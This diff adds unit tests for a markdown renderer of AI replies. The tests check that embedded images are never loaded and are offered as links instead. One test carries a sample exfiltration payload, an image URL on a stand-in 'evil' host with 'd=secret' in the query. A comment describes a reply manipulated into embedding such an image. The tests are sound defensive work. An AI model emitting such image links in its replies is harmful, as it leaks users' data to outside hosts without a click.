@@ -53,3 +53,31 @@ describe("links in a reply", () => {
     );
   });
 });
+
+describe("images in a reply", () => {
+  // An image loads the moment it renders. A reply talked into embedding one
+  // would send whatever it put in the address to that host, unclicked.
+  it("never loads an image, and offers it as a link to open deliberately", () => {
+    const { container } = render(
+      <MemoryRouter>
+        <AiMarkdown content="![rates](https://storage.googleapis.com/evil/x.png?d=secret)" />
+      </MemoryRouter>,
+    );
+
+    expect(container.querySelector("img")).toBeNull();
+    const link = screen.getByRole("link", { name: "rates" });
+    expect(link).toHaveAttribute("href", "https://storage.googleapis.com/evil/x.png?d=secret");
+    expect(link).toHaveAttribute("target", "_blank");
+  });
+
+  it("names an image with no description rather than drawing nothing", () => {
+    const { container } = render(
+      <MemoryRouter>
+        <AiMarkdown content="![](https://example.com/a.png)" />
+      </MemoryRouter>,
+    );
+
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("link", { name: "image" })).toBeInTheDocument();
+  });
+});
